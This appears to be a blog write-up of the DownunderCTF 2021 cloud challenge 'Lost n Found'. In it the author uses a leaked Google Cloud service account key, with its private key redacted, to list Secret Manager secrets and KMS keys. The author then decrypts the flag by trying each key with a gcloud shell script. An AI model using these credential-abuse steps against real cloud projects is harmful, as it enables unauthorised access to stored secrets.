---
title: 'DownunderCTF 2021: Lost n Found'
date: 2021-09-26T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/ductf/lostnfoundtitle.png
categories:
  - Write-Ups
  - Cloud
---
DownunderCTF has become a big event in the yearly CTF calendar. Nice job all involved! It's also one of the only CTFs that is run in a cloud region geographically near me. Loved the super fast ping times to all the infrastructure. What a luxury! 

Having Google Cloud as a sponsor there were a few Cloud security related challenges in the CTF this year. Given some of what I do for a living is cloud security I gave them a go. This was the "hardest" one with fewer solves

#### <a name="lostnfound"></a>Lost n Found - Cloud - 430 points

This challenge reads:

```
Found this service account key after the results of a pen test but we
are running out of time and we are looking to increase the impact of
our finding. 

Can you get some results so we can maximise our bounty,
we know there is highly secretive material in their Cloud Project!
```

Along with the clue there's a JSON file:

```json
{
  "type": "service_account",
  "project_id": "ductf-lost-n-found",
  "private_key_id": "204a0a9969f97549e646f592d1732f5e478492d7",
  "private_key": "-----BEGIN PRIVATE KEY-----\n[redacted so github doesnt nuke this]\n-----END PRIVATE KEY-----\n",
  "client_email": "legacy-svc-account@ductf-lost-n-found.iam.gserviceaccount.com",
  "client_id": "103100904971904770440",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/legacy-svc-account%40ductf-lost-n-found.iam.gserviceaccount.com"
}

```

Fortunately the clue made a lot of sense to me right away. The **secretive** word in the clue was actually italicised so it was something that was supposed to draw attention.

First though I had to figure out what the JSON was. At first glimpse I knew but to be clear, this is a service account key that has been exported from a Google Cloud project. It relates to the following identity `legacy-svc-account@ductf-lost-n-found.iam.gserviceaccount.com`. This JSON file contains the following information:

- The GCP project the key exists within (`ductf-lost-n-found`)
- The Service Account principle (`legacy-svc-account@ductf-lost-n-found.iam.gserviceaccount.com`)
- The private key necessary to use as a credential to authenticate as that principle.

With this alone we are able to act as this service account using the Google Cloud APIs using any privileges that are bound on the IAM policy for that identity.

But what APIs are enabled in this project? One way to find out is to ask the GCP Resource Manager API. However this is not enabled on the project `ductf-lost-n-found`. Furthermore, our service account does not grant us the authority to enable APIs so we can't just turn it on ourselves.

I tried a few other enumeration techniques like figuring out what GCS buckets existed etc but none of the APIs were enabled. 

Then remembered the Secrets manager API and that seemed likely. I fired up my Google Cloud SDK docker container to keep things hermetic and seperate from my ordinary day to day cloud stuff and looked around.

I auth as the service account then set the project context I want to work within:

```shell
# docker run -it gcr.io/google.com/cloudsdktool/cloud-sdk:latest /bin/bash
$ gcloud auth activate-service-account legacy-svc-account@ductf-lost-n-found.iam.gserviceaccount.com --key-file=legacy.json
Activated service account credentials for: [legacy-svc-account@ductf-lost-n-found.iam.gserviceaccount.com]
$ gcloud config set project ductf-lost-n-found
Updated property [core/project].
```

Next I asked Secrets manager if it had any secrets lying around?

```shell
$ gcloud secrets list                                                                                    
NAME         CREATED              REPLICATION_POLICY  LOCATIONS
unused_data  2021-09-21T05:20:41  automatic           -

$ gcloud secrets describe unused_data                                                                    
createTime: '2021-09-21T05:20:41.876436Z'
etag: '"15cc7a8f10dbd4"'
name: projects/216026370280/secrets/unused_data
replication:
  automatic: {}
```

Cool! We see a secret named `unused_data`, lets grab it - was it this easy?

```shell
$ gcloud secrets versions access latest --secret="unused_data"                                           
CiQA+H4IQ1Jq5yU+Ta7XvpOhnpYLiRYXxem6jVTzdqKxGaczATsSZgCa9lYSABC+4ve1pQuvy80nJi/pWv5hntGiPOiO7CQoC/Iqw1XOCgDBdmYEi9ynYb/qykTRDZiyGaheHSReUf0ZNr/hUjPrIXq2VCGSMtF1RFVt73Rp1i3/baMJxLOSmCN3cbT0xQ==
```

Huh.. Decoding the base64 its a binary data blob with no structure. It honest looks encrypted so I got stuck for a while.

After going out for some lunch it occured to me that of course Cloud services don't only store secrets for you, they also do Key management. So I dug up the documentation on GCP Key Management Service. Eventually I found this:

```shell
$ gcloud kms keyrings list --location australia-southeast2
NAME
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks
```

Woo! A keyring, whats inside?

```shell
gcloud kms keys list --keyring projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks
NAME                                                                                                         PURPOSE          ALGORITHM                    PROTECTION_LEVEL  LABELS  PRIMARY_ID  PRIMARY_STATE
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-big-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-bronze-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-diamond-key   ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-fat-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-filthy-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-golden-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-jail-key      ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-key-key       ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-northern-key  ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-secret-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-silver-key    ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-small-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/a-smart-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
projects/ductf-lost-n-found/locations/australia-southeast2/keyRings/wardens-locks/cryptoKeys/an-iron-key     ENCRYPT_DECRYPT  GOOGLE_SYMMETRIC_ENCRYPTION  SOFTWARE                  1           ENABLED
```

Oh a tonne of keys!

Well only one way to find out, I attempted to decrypt my data with all the keys :)

I made a shell script called `trykey.sh` with this in it:

```shell
#!/bin/bash
gcloud kms decrypt \
--key=$1 \
--keyring=wardens-locks \
--location=australia-southeast2 \
--ciphertext-file=ciphertext \
--plaintext-file=flag.txt 2> /dev/null

cat flag.txt 2>/dev/null
```

Then I stored the ciphertext locally and tried every key:

```shell
$ gcloud secrets versions access latest --secret="unused_data" | base64 -d > ciphertext
$ chmod +x trykey.sh
$ ./trykey.sh a-big-key
$ ./trykey.sh a-bronze-key
$ ./trykey.sh a-diamond-key
$ ./trykey.sh a-fat-key
$ ./trykey.sh a-filthy-key
$ ./trykey.sh a-golden-key
$ ./trykey.sh a-jail-key
$ ./trykey.sh a-key-key
$ ./trykey.sh a-northern-key
$ ./trykey.sh a-secret-key
$ ./trykey.sh a-silver-key
DUCTF{its_time_to_clean_up_your_service_account_permissions!}
```

Woot there it is! Nice one :D

